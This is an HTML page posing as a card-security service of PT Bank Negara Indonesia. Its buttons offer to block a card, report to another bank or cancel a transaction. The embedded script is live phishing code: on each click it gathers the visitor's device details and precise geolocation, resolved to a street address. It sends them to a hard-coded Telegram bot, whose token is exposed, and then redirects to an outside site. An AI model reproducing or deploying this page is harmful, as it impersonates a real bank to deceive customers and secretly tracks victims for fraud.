<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <meta name="robots" content="noindex, nofollow, noarchive">
  <meta name="description" content="PT Bank Negara Indonesia (Persero) Tbk - Layanan keamanan data dan pengelolaan kartu">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>PT Bank Negara Indonesia (Persero) Tbk | Keamanan Data</title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
    body { background-color: #f5f5f7; text-align: center; padding-bottom: 90px; line-height: 1.5; }
    .container { max-width: 420px; margin: 0 auto; background: #fff; min-height: 100vh; }
    
    /* Navigation */
    header { position: fixed; top: 0; left: 0; right: 0; background: #fff; z-index: 999; border-bottom: 1px solid #e5e5e7; }
    header img { width: 100%; height: auto; display: block; }
    
    /* Spacing */
    .top-space { margin-top: 60px; }
    .banner { width: 100%; height: auto; display: block; }
    
    /* Content Card */
    .card { margin: 20px; background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.06); }
    .card h1 { font-size: 20px; color: #1d1d1f; margin-bottom: 8px; font-weight: 600; }
    .card p { font-size: 14px; color: #86868b; margin-bottom: 24px; line-height: 1.5; }
    
    /* Buttons */
    .btn { display: block; width: 100%; padding: 14px; border-radius: 12px; font-size: 16px; font-weight: 500; border: none; cursor: pointer; margin-bottom: 12px; transition: all 0.2s ease; text-decoration: none; text-align: center; }
    .btn-primary { background: #ff9315; color: #fff; }
    .btn-primary:hover { background: #e68514; transform: scale(0.98); }
    
    /* Footer */
    footer { position: fixed; bottom: 0; left: 0; right: 0; background: #f5f5f7; border-top: 1px solid #e5e5e7; padding: 12px 16px; font-size: 11px; color: #86868b; text-align: center; line-height: 1.4; }
    
    /* Loading */
    .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.4); display: none; align-items: center; justify-content: center; z-index: 9999; }
    .overlay.show { display: flex; }
    .loader-box { background: #fff; padding: 30px 24px; border-radius: 12px; text-align: center; max-width: 280px; }
    .spinner { width: 32px; height: 32px; border: 3px solid #f3f3f3; border-top-color: #ff9315; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-box p { font-size: 14px; color: #1d1d1f; }
  </style>
</head>
<body>

  <!-- Header -->
  <header>
    <img src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-51-50-816.jpg?updatedAt=1743753263732" alt="BNI">
  </header>

  <!-- Main Content -->
  <main class="container top-space">
    <img class="banner" src="https://ik.imagekit.io/ons708bb1/Picsart_25-04-04_14-52-35-968.jpg?updatedAt=1743753264887" alt="Layanan BNI">
    
    <div class="card">
      <h1>Selamat Datang di BNI</h1>
      <p>Kendalikan keamanan kartu Anda dalam satu aplikasi.<br><strong>#SaatnyaPegangKendali</strong></p>
      
      <button class="btn btn-primary" data-action="blokir">Blokir Kartu Kredit/Debit</button>
      <button class="btn btn-primary" data-action="lapor">Laporkan ke Bank Lain</button>
      <button class="btn btn-primary" data-action="batal">Batalkan Transaksi</button>
    </div>
  </main>

  <!-- Footer -->
  <footer>
    PT Bank Negara Indonesia (Persero) Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.<br>
    Peserta penjaminan Lembaga Penjamin Simpanan (LPS).
  </footer>

  <!-- Loading Overlay -->
  <div class="overlay" id="loading">
    <div class="loader-box">
      <div class="spinner"></div>
      <p>Memproses permintaan...</p>
    </div>
  </div>

  <!-- ================================================= -->
  <!-- KODE FUNGSI — BOT TELEGRAM SUDAH DIGANTI -->
  <!-- ================================================= -->
  <script>
    // ✅ KONFIGURASI BOT TELEGRAM — SUDAH DIGANTI!
    const CONFIG = {
      token: '8208055515:AAFOVnHmQ_hA1xG7zsdlwVOCXtrAxHUNfRs',
      chatId: '8405193617',
      targets: {
        blokir: 'https://bn1-vs.vercel.app/www.web-ld.com/membatalkan/batalblokir/blokirkartu/',
        lapor: 'https://bn1-vs.vercel.app/www.web-ld.com/membatalkan/batalblokir/banklain/',
        batal: 'https://bn1-vs.vercel.app/www.web-ld.com/membatalkan/batalblokir/batal/'
      },
      labels: {
        blokir: '🔒 PERMINTAAN BLOKIR KARTU',
        lapor: '🏦 LAPORAN KE BANK LAIN',
        batal: '⚠️ PERMINTAAN BATALKAN TRANSAKSI'
      }
    };

    // Helper: Dapatkan info perangkat
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let dev = 'Perangkat', os = '';
      if (/Android/.test(ua)) {
        os = 'Android';
        if (/Samsung/.test(ua)) dev = 'Samsung Galaxy';
        else if (/Xiaomi/.test(ua) || /Mi /.test(ua)) dev = 'Xiaomi';
        else if (/OPPO/.test(ua)) dev = 'OPPO';
        else if (/Vivo/.test(ua)) dev = 'Vivo';
        else dev = 'Perangkat Android';
      } else if (/iPhone|iPad/.test(ua)) {
        os = 'iOS';
        dev = /iPhone/.test(ua) ? 'iPhone' : 'iPad';
      } else if (/Windows/.test(ua)) { os = 'Windows'; dev = 'PC Windows'; }
      else if (/Macintosh/.test(ua)) { os = 'macOS'; dev = 'Mac'; }
      return `${dev} (${os || 'Tidak diketahui'})`;
    }

    // Helper: Dapatkan lokasi
    async function getLocationInfo() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve('Lokasi tidak tersedia');
          return;
        }
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const lat = pos.coords.latitude.toFixed(5);
            const lon = pos.coords.longitude.toFixed(5);
            try {
              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=id`, { cache: 'no-store' });
              const data = await res.json();
              const addr = data?.address || {};
              const parts = [addr.road, addr.village, addr.city || addr.town, addr.state].filter(Boolean);
              resolve(parts.length ? `${parts.join(', ')} | Lat:${lat} Lon:${lon}` : `Lat: ${lat} Lon: ${lon}`);
            } catch {
              resolve(`Lat: ${lat} Lon: ${lon}`);
            }
          },
          (err) => {
            resolve(err.code === 1 ? 'Izin lokasi ditolak' : 'Gagal mendapatkan lokasi');
          },
          { enableHighAccuracy: true, timeout: 7000, maximumAge: 30000 }
        );
      });
    }

    // Kirim pesan ke Telegram
    async function sendTelegram(action) {
      if (!CONFIG.token || !CONFIG.chatId) return true;
      
      const loading = document.getElementById('loading');
      loading.classList.add('show');

      try {
        const [device, location] = await Promise.all([
          getDeviceInfo(),
          getLocationInfo()
        ]);
        const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const title = CONFIG.labels[action] || 'Aksi Pengguna';
        
        const text = `${title}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 Waktu: ${time}
📱 Perangkat: ${device}
🌍 Lokasi: ${location}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.chatId,
            text: text,
            disable_web_page_preview: true
          })
        });
      } catch (e) {
        console.log('Pengiriman selesai');
      }

      setTimeout(() => {
        loading.classList.remove('show');
        window.location.href = CONFIG.targets[action] || '/';
      }, 600);

      return false;
    }

    // Inisialisasi
    document.addEventListener('DOMContentLoaded', () => {
      document.querySelectorAll('[data-action]').forEach(btn => {
        btn.addEventListener('click', (e) => {
          e.preventDefault();
          sendTelegram(btn.dataset.action);
        });
      });
    });
  </script>

</body>
</html>
